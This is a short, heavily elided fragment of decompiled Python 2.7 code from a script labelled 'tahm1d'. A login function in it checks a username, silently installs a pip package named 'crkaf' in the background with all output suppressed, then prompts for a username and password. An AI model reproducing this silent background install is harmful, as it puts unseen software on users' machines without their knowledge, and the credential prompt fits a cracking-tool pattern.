# Filenames : <tahm1d>
# Python bytecode : 2.7
# Time decompiled : Fri Sep 11 14:08:35 2020
...
def log():
    ...
    if usr == haxuser:
        ...
        system('clear')
        system('pip2 install crkaf --upgrade > /dev/null 2>&1 &')
        print logo
        print '\x1b[1;92mINPUT USERNAME & PASSWORD\x1b[0m'
        print '\x1b[1;96m-------------------------\x1b[0m'
        print ''
